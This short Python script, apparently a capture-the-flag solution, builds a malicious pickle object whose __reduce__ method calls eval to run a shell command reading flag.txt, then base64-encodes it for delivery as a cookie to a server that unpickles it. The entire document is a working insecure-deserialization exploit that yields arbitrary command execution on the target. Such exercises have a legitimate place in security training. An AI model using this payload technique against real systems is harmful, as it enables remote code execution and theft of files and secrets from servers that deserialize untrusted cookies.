import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        return (eval, ("{'username': __import__('os').popen('cat flag.txt').read()}", ))

# Generate the malicious pickle payload
payload = pickle.dumps(Exploit())
# Base64 encode the payload for the cookie
b64_payload = base64.b64encode(payload)

print(b64_payload)